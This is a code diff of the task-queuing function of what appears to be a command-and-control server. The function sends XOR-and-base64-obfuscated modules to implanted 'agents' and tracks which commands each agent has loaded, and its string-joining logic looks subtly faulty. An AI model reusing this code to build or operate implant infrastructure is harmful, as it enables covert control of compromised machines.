@@ -211,16 +211,16 @@ def new_task(data):
 
     :param data:
     """
-    # todo Server-Side checks for task availability
     data = json.loads(data)
     agent = AgentModel.query.filter_by(name=data['agent_name']).first()
-    available_modules = agent.implant.available_modules
-    method_name = data['name']
-    if method_name in available_modules.keys():
-        module = available_modules[method_name]
+    available_commands = agent.implant.available_commands
+    command = data['name']
+    if command in available_commands.keys() and command not in agent.loaded_commands:
+        agent.loaded_commands = command if not agent.loaded_commands else ','.join(agent.loaded_commands) + f',{command}'
+        module = available_commands[command]
         with open(f'{os.getcwd()}{module}', 'rb') as fd:
             key, file = xor_base64(fd.read())
-        task = TaskModel(name='load', description=f'load module for {method_name}', agent=agent, arguments=f'{key},{file},{string_to_base64(method_name)}', type='1')
-        _commit([task])
-    task = TaskModel(name=method_name, description=data['description'], agent=agent, arguments=data['arguments'], type=data['type'])
+        task = TaskModel(name='load', description=f'load module for {command}', agent=agent, arguments=f'{key},{file},{string_to_base64(command)}', type='1')
+        _commit([task, agent])
+    task = TaskModel(name=command, description=data['description'], agent=agent, arguments=data['arguments'], type=data['type'])
     _commit([task])
